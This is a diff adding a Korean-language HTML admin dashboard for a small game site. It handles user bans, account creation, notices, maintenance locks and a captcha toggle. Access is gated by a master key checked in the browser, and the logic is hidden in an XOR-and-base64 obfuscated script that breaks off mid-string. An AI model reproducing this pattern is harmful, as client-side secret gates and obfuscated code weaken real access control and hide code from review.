@@ -1,0 +1,539 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>스피릿 유니버스 - 개발자 전용 관리자 대시보드</title>
+<style>
+:root {
+  --bg-dark: #0a0815;
+  --bg-card: #151128;
+  --bg-card-hover: #1f1a3a;
+  --text-main: #f0f2ff;
+  --text-sub: #a0a5cc;
+  --accent-gold: #ffd166;
+  --accent-cyan: #00f0ff;
+  --accent-pink: #ff2a85;
+  --accent-red: #ff4757;
+  --accent-green: #2ed573;
+  --border: #28214d;
+  --border-focus: #00f0ff;
+}
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body {
+  background: var(--bg-dark);
+  color: var(--text-main);
+  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Malgun Gothic", sans-serif;
+  line-height: 1.6;
+  padding: 16px;
+  min-height: 100vh;
+}
+.sr-only {
+  position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px;
+  overflow: hidden; clip: rect(0,0,0,0); border: 0;
+}
+.container {
+  max-width: 1000px;
+  margin: 0 auto;
+}
+header {
+  background: linear-gradient(135deg, #1f1345, #120c29);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 20px;
+  margin-bottom: 20px;
+  display: flex;
+  flex-wrap: wrap;
+  justify-content: space-between;
+  align-items: center;
+  gap: 12px;
+}
+h1 {
+  font-size: 24px;
+  color: var(--accent-gold);
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.badge-dev {
+  background: var(--accent-pink);
+  color: #fff;
+  font-size: 12px;
+  padding: 3px 8px;
+  border-radius: 20px;
+  font-weight: 700;
+  letter-spacing: 0.5px;
+}
+.btn {
+  background: #2a2254;
+  color: #fff;
+  border: 1px solid var(--border);
+  padding: 10px 16px;
+  border-radius: 8px;
+  font-size: 14px;
+  font-weight: 600;
+  cursor: pointer;
+  transition: all 0.2s;
+  display: inline-flex;
+  align-items: center;
+  gap: 6px;
+}
+.btn:hover, .btn:focus {
+  background: var(--bg-card-hover);
+  border-color: var(--border-focus);
+  outline: none;
+}
+.btn-gold {
+  background: linear-gradient(135deg, #e6b800, #b38600);
+  color: #000;
+  border: none;
+}
+.btn-gold:hover, .btn-gold:focus {
+  background: linear-gradient(135deg, #ffd166, #e6b800);
+}
+.btn-cyan {
+  background: #00b4d8;
+  color: #000;
+  border: none;
+}
+.btn-cyan:hover, .btn-cyan:focus {
+  background: var(--accent-cyan);
+}
+.btn-danger {
+  background: #c0392b;
+  color: #fff;
+  border: none;
+}
+.btn-danger:hover, .btn-danger:focus {
+  background: var(--accent-red);
+}
+.btn-success {
+  background: #27ae60;
+  color: #fff;
+  border: none;
+}
+.btn-success:hover, .btn-success:focus {
+  background: var(--accent-green);
+}
+.stats-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+  gap: 14px;
+  margin-bottom: 24px;
+}
+.stat-card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 16px;
+  text-align: center;
+}
+.stat-val {
+  font-size: 32px;
+  font-weight: 800;
+  margin: 4px 0;
+}
+.stat-val.gold { color: var(--accent-gold); }
+.stat-val.red { color: var(--accent-red); }
+.stat-val.cyan { color: var(--accent-cyan); }
+.stat-val.green { color: var(--accent-green); }
+.card {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 12px;
+  padding: 20px;
+  margin-bottom: 24px;
+}
+.card h2 {
+  font-size: 18px;
+  color: var(--accent-cyan);
+  margin-bottom: 14px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 8px;
+  display: flex;
+  align-items: center;
+  gap: 8px;
+}
+.form-row {
+  display: flex;
+  flex-wrap: wrap;
+  gap: 12px;
+  margin-bottom: 14px;
+  align-items: flex-end;
+}
+.form-group {
+  flex: 1;
+  min-width: 180px;
+}
+label {
+  display: block;
+  font-size: 13px;
+  color: var(--text-sub);
+  margin-bottom: 6px;
+  font-weight: 600;
+}
+input, select, textarea {
+  width: 100%;
+  background: #0d0a1d;
+  border: 1px solid var(--border);
+  border-radius: 8px;
+  padding: 10px 12px;
+  color: #fff;
+  font-size: 14px;
+  transition: border-color 0.2s;
+}
+input:focus, select:focus, textarea:focus {
+  border-color: var(--accent-cyan);
+  outline: none;
+}
+table {
+  width: 100%;
+  border-collapse: collapse;
+  margin-top: 12px;
+}
+th, td {
+  padding: 12px 10px;
+  text-align: left;
+  border-bottom: 1px solid var(--border);
+  font-size: 14px;
+}
+th {
+  background: #100c22;
+  color: var(--accent-gold);
+  font-weight: 700;
+}
+tr:hover td {
+  background: var(--bg-card-hover);
+}
+.status-badge {
+  display: inline-block;
+  padding: 3px 8px;
+  border-radius: 12px;
+  font-size: 12px;
+  font-weight: 700;
+}
+.status-active { background: #1e3a2f; color: var(--accent-green); }
+.status-banned { background: #401824; color: var(--accent-red); }
+.status-admin { background: #3c3216; color: var(--accent-gold); }
+.toast {
+  position: fixed;
+  bottom: 24px;
+  right: 24px;
+  background: #1b1638;
+  border: 1px solid var(--accent-cyan);
+  color: #fff;
+  padding: 14px 20px;
+  border-radius: 8px;
+  box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+  z-index: 1000;
+  display: none;
+  font-weight: 600;
+}
+.tabs {
+  display: flex;
+  gap: 8px;
+  margin-bottom: 16px;
+  border-bottom: 1px solid var(--border);
+  padding-bottom: 8px;
+}
+.tab-btn {
+  background: transparent;
+  color: var(--text-sub);
+  border: none;
+  padding: 8px 16px;
+  font-size: 15px;
+  font-weight: 700;
+  cursor: pointer;
+  border-radius: 6px;
+}
+.tab-btn.active {
+  background: #251d4d;
+  color: var(--accent-cyan);
+}
+#auth-wall {
+  position: fixed;
+  top: 0; left: 0; width: 100%; height: 100%;
+  background: var(--bg-dark);
+  z-index: 9999;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  padding: 20px;
+}
+.auth-box {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: 14px;
+  padding: 32px;
+  max-width: 420px;
+  width: 100%;
+  text-align: center;
+  box-shadow: 0 12px 36px rgba(0,0,0,0.8);
+}
+</style>
+  <script src="spirit-core.js"></script>
+</head>
+<body>
+
+<!-- 접근성 스크린리더 낭독 영역 -->
+<div id="sr-announcer" class="sr-only" aria-live="assertive"></div>
+
+<!-- 개발자 인증 락 화면 -->
+<div id="auth-wall" role="dialog" aria-modal="true" aria-labelledby="auth-title">
+  <div class="auth-box">
+    <div style="font-size: 48px; margin-bottom: 12px;">🔒</div>
+    <h2 id="auth-title" style="color:var(--accent-gold); margin-bottom: 8px;">스피릿 유니버스 개발자 인증</h2>
+    <p style="color:var(--text-sub); font-size:14px; margin-bottom: 20px;">
+      비공개 관리자 권한 대시보드입니다.<br>개발자 마스터 키를 입력해주세요.
+    </p>
+    <div style="margin-bottom: 16px; text-align: left;">
+      <label for="master-key-input">마스터 키</label>
+      <input type="password" id="master-key-input" placeholder="마스터 키를 입력하세요" autocomplete="current-password">
+    </div>
+    <button class="btn btn-gold" style="width:100%; justify-content:center; padding:12px;" onclick="checkMasterAuth()">
+      🚀 관리자 모드 접속
+    </button>
+    <p id="auth-err" style="color:var(--accent-red); font-size:13px; margin-top:12px; display:none;"></p>
+  </div>
+</div>
+
+<!-- 메인 관리자 컨테이너 -->
+<div class="container" id="admin-main" style="display:none;">
+  <header>
+    <div>
+      <h1>⚡ 스피릿 유니버스 관리자 센터 <span class="badge-dev">DEVELOPER ADMIN</span></h1>
+      <p style="color:var(--text-sub); font-size:13px; margin-top:4px;">
+        통합 계정 유저 관리 · ID 밴(차단) 및 해제 · 신규 ID 생성 · 전체 공지 제어
+      </p>
+    </div>
+    <div style="display:flex; gap:8px;">
+      <button class="btn btn-cyan" onclick="loadRegistry(true)" aria-label="클라우드 데이터 새로고침">
+        🔄 동기화 새로고침
+      </button>
+      <button class="btn btn-danger" onclick="logoutAdmin()" aria-label="관리자 로그아웃">
+        🔒 나가기
+      </button>
+    </div>
+  </header>
+
+  <!-- 통계 카드 -->
+  <section class="stats-grid" aria-label="시스템 종합 현황">
+    <div class="stat-card">
+      <div style="color:var(--text-sub); font-size:13px;">총 등록 유저</div>
+      <div class="stat-val cyan" id="stat-total-users">0</div>
+      <div style="font-size:12px; color:var(--text-sub);">스피릿 유니버스 통합 계정</div>
+    </div>
+    <div class="stat-card">
+      <div style="color:var(--text-sub); font-size:13px;">정상 활동 유저</div>
+      <div class="stat-val green" id="stat-active-users">0</div>
+      <div style="font-size:12px; color:var(--text-sub);">8개 게임 이용 가능</div>
+    </div>
+    <div class="stat-card">
+      <div style="color:var(--text-sub); font-size:13px;">🚫 차단(BAN) 유저</div>
+      <div class="stat-val red" id="stat-banned-users">0</div>
+      <div style="font-size:12px; color:var(--text-sub);">게임 접속 즉시 차단됨</div>
+    </div>
+    <div class="stat-card">
+      <div style="color:var(--text-sub); font-size:13px;">관리자 계정</div>
+      <div class="stat-val gold" id="stat-admin-users">0</div>
+      <div style="font-size:12px; color:var(--text-sub);">최고 권한 보유</div>
+    </div>
+  </section>
+
+  <!-- 1. 신규 아이디 생성 및 수동 밴 카드 -->
+  <section class="card" aria-labelledby="sec-create-title">
+    <h2 id="sec-create-title">➕ 신규 ID 생성 & 권한 발급</h2>
+    <form id="create-user-form" onsubmit="handleCreateUser(event)">
+      <div class="form-row">
+        <div class="form-group">
+          <label for="new-username">아이디 (ID)</label>
+          <input type="text" id="new-username" placeholder="영문/숫자/한글 2~16자" required>
+        </div>
+        <div class="form-group">
+          <label for="new-role">계정 권한 / 등급</label>
+          <select id="new-role">
+            <option value="user">일반 유저 (User)</option>
+            <option value="vip">⭐ VIP 유저</option>
+            <option value="tester">🧪 베타 테스터</option>
+            <option value="admin">👑 관리자 (Admin)</option>
+          </select>
+        </div>
+        <div class="form-group">
+          <label for="new-note">메모 / 특이사항</label>
+          <input type="text" id="new-note" placeholder="예: 현목 님 본계정, 학교 친구 등">
+        </div>
+        <button type="submit" class="btn btn-gold" style="height:42px;">
+          ➕ ID 생성 및 등록
+        </button>
+      </div>
+    </form>
+  </section>
+
+  <!-- 2. 전체 긴급 공지 관리 -->
+  <section class="card" aria-labelledby="sec-notice-title">
+    <h2 id="sec-notice-title">📢 8대 게임 전체 긴급 공지 제어</h2>
+    <div class="form-row">
+      <div class="form-group" style="flex:3;">
+        <label for="sys-notice-input">전체 공지 메시지 (모든 게임 상단에 실시간 노출)</label>
+        <input type="text" id="sys-notice-input" placeholder="예: 오늘 신작 갓겜 2종 업데이트 완료! 즐겁게 플레이하세요.">
+      </div>
+      <button class="btn btn-cyan" onclick="updateSystemNotice()" style="height:42px;">
+        📢 공지 즉시 전송
+      </button>
+      <button class="btn" onclick="clearSystemNotice()" style="height:42px;">
+        공지 내리기
+      </button>
+    </div>
+  </section>
+
+  <!-- 2.5 서버 점검 및 긴급 락(셧다운) 제어 -->
+  <section class="card" aria-labelledby="sec-maint-title" style="border: 1px solid var(--accent-gold);">
+    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:12px;">
+      <h2 id="sec-maint-title" style="border:none; margin:0; padding:0; color:var(--accent-gold);">
+        🛠️ 스피릿 8대 게임 전체 서버 점검 및 긴급 락 제어
+      </h2>
+      <span id="maint-status-badge" style="padding:4px 12px; border-radius:20px; font-weight:700; font-size:13px; border:1px solid var(--accent-green); color:var(--accent-green);">
+        🟢 정상 운영 중
+      </span>
+    </div>
+    <p style="color:var(--text-sub); font-size:13px; margin-bottom:14px; line-height:1.6;">
+      업데이트 배포 및 점검 시 유저 데이터 보호를 위해 <b>전체 8대 게임의 서버를 일괄 잠그고 검은 화면에 점검 사유와 종료 시간</b>을 큰 글씨로 안내합니다.<br>
+      어드민 센터에서 원클릭으로 잠그거나 해제할 수 있으며, 개발자 전용 CLI 스크립트(`server_lock.py`)로도 동일하게 제어됩니다.
+    </p>
+    <div class="form-row">
+      <div class="form-group" style="flex:2;">
+        <label for="maint-reason-input">점검 사유</label>
+        <input type="text" id="maint-reason-input" value="정기 서버 점검 및 신규 기능 업데이트 중입니다." placeholder="예: 3:3 대전 밸런스 패치 및 데이터 무결성 점검">
+      </div>
+      <div class="form-group" style="flex:1;">
+        <label for="maint-until-input">예정 오픈 시간</label>
+        <input type="text" id="maint-until-input" value="작업 완료 후 즉시 정상 오픈" placeholder="예: 약 15분 소요 예정">
+      </div>
+    </div>
+    <div style="display:flex; gap:10px; flex-wrap:wrap;">
+      <button type="button" class="btn btn-danger" onclick="toggleMaintenanceMode()" style="padding:11px 20px;">
+        🔒 서버 잠금 (전체 서버 내리기)
+      </button>
+      <button type="button" class="btn btn-success" onclick="liftMaintenanceMode()" style="padding:11px 20px;">
+        🟢 서버 오픈 (점검 해제 및 정상화)
+      </button>
+      <button type="button" class="btn btn-cyan" onclick="loadRegistry(true)" style="padding:11px 16px;">
+        🔄 서버 상태 새로고침
+      </button>
+    </div>
+  </section>
+
+  <!-- 2.6 보안 검사 (100개 풀 봇 방어 캡차) ON/OFF 제어 -->
+  <section class="card" aria-labelledby="sec-security-title" style="border: 1px solid var(--accent-cyan);">
+    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:12px;">
+      <h2 id="sec-security-title" style="border:none; margin:0; padding:0; color:var(--accent-cyan);">
+        🛡️ 스피릿 10대 게임 보안 검사 (Captcha 게이트) ON/OFF 제어
+      </h2>
+      <span id="security-status-badge" style="padding:4px 12px; border-radius:20px; font-weight:700; font-size:13px; border:1px solid var(--accent-green); color:var(--accent-green);">
+        🟢 보안 검사 켜짐 (ON)
+      </span>
+    </div>
+    <p style="color:var(--text-sub); font-size:13px; margin-bottom:14px; line-height:1.6;">
+      게임 접속 시 <b>100개 보안 풀 코드 & 캔버스 음성 캡차</b>의 출력 여부를 원클릭으로 제어합니다.<br>
+      • <b>보안 검사 켜기 (ON)</b>: AI 크롤러 및 봇 차단을 위해 모든 게임 입장 시 4자리 캡차 인증 게이트를 활성화합니다.<br>
+      • <b>보안 검사 끄기 (OFF)</b>: 캡차 없이 게임 화면으로 즉시 진입하여 빠른 테스트와 자유로운 플레이가 가능합니다.
+    </p>
+    <div style="display:flex; gap:10px; flex-wrap:wrap;">
+      <button type="button" class="btn btn-success" onclick="enableSecurityCheck()" style="padding:11px 20px;" aria-label="보안 검사 켜기">
+        🛡️ 보안 검사 켜기 (ON)
+      </button>
+      <button type="button" class="btn btn-danger" onclick="disableSecurityCheck()" style="padding:11px 20px;" aria-label="보안 검사 끄기">
+        🔓 보안 검사 끄기 (OFF)
+      </button>
+      <button type="button" class="btn btn-cyan" onclick="loadRegistry(true)" style="padding:11px 16px;" aria-label="보안 검사 상태 새로고침">
+        🔄 상태 새로고침
+      </button>
+    </div>
+  </section>
+
+  <!-- 3. 유저 관리 테이블 (정상 / 차단 탭) -->
+  <section class="card" aria-labelledby="sec-users-title">
+    <div style="display:flex; justify-content:space-between; align-items:center; flex-wrap:wrap; gap:10px; margin-bottom:12px;">
+      <h2 id="sec-users-title" style="border:none; margin:0; padding:0;">👥 유저 목록 및 권한 관리</h2>
+      <div class="tabs" style="margin:0; border:none; padding:0;">
+        <button class="tab-btn active" id="tab-all" onclick="switchUserTab('all')">전체 유저 (<span id="cnt-tab-all">0</span>)</button>
+        <button class="tab-btn" id="tab-banned" onclick="switchUserTab('banned')">🚫 차단(BAN) 목록 (<span id="cnt-tab-banned">0</span>)</button>
+      </div>
+    </div>
+
+    <!-- 검색 바 & 빠른 밴 -->
+    <div class="form-row" style="background:#0e0b1f; padding:12px; border-radius:8px; margin-bottom:12px;">
+      <div class="form-group">
+        <label for="search-user">유저 검색</label>
+        <input type="text" id="search-user" placeholder="아이디 또는 메모 검색..." oninput="renderUsersTable()">
+      </div>
+      <div class="form-group">
+        <label for="quick-ban-id">특정 ID 직접 밴(차단) 등록</label>
+        <div style="display:flex; gap:6px;">
+          <input type="text" id="quick-ban-id" placeholder="차단할 아이디">
+          <input type="text" id="quick-ban-reason" placeholder="차단 사유 (치트, 악용 등)">
+          <button type="button" class="btn btn-danger" onclick="handleQuickBan()" style="white-space:nowrap;">
+            🚫 즉시 차단
+          </button>
+        </div>
+      </div>
+    </div>
+
+    <div style="overflow-x:auto;">
+      <table aria-label="스피릿 유니버스 등록 유저 목록">
+        <thead>
+          <tr>
+            <th scope="col">아이디 (ID)</th>
+            <th scope="col">권한</th>
+            <th scope="col">상태</th>
+            <th scope="col">등록일시 / 차단사유</th>
+            <th scope="col">관리 액션</th>
+          </tr>
+        </thead>
+        <tbody id="user-table-body">
+          <!-- 자바스크립트로 동적 렌더링 -->
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <!-- 10대 게임 바로가기 -->
+  <section class="card" aria-labelledby="sec-links-title">
+    <h2 id="sec-links-title">🎮 서비스 중인 10대 게임 제국 바로가기</h2>
+    <div style="display:grid; grid-template-columns:repeat(auto-fit, minmax(220px, 1fr)); gap:10px;">
+      <a class="btn" href="action.html" target="_blank" style="border-color:var(--neon-magenta,#ff0055);">🗡️ 스피릿 블레이드 (액션)</a>
+      <a class="btn" href="rpg.html" target="_blank" style="border-color:var(--gold,#ffd166);">🛡️ 스피릿 던전 (RPG)</a>
+      <a class="btn" href="champions.html" target="_blank">⚔️ 스피릿 최강자들</a>
+      <a class="btn" href="rogue.html" target="_blank">🌌 스피릿 로그</a>
+      <a class="btn" href="defense.html" target="_blank">🎲 운빨 스피릿 디펜스</a>
+      <a class="btn" href="overcharge.html" target="_blank">⚡ 오버차지</a>
+      <a class="btn" href="survivor.html" target="_blank">🦇 미드나잇 서바이벌</a>
+      <a class="btn" href="gacha.html" target="_blank">🎰 가챠 아레나</a>
+      <a class="btn" href="forest.html" target="_blank">🍃 모여봐요 우리 섬</a>
+      <a class="btn" href="index.html" target="_blank">🏟️ 스피릿 아레나</a>
+    </div>
+  </section>
+</div>
+
+<div id="toast" class="toast" role="status"></div>
+
+<script>
+/**
+ * SPIRIT UNIVERSE ADMIN PROPRIETARY ENGINE (v3.9.2-MAINT-LOCKED)
+ */
+(function() {
+  var _k = [83, 112, 105, 114, 105, 116, 85, 110, 105, 118, 101, 114, 115, 101, 75, 101, 121, 50, 48, 50, 54, 33, 65, 110, 116, 105, 83, 99, 114, 97, 112, 101, 80, 114, 111, 116, 101, 99, 116, 101, 100];
+  var _b = atob("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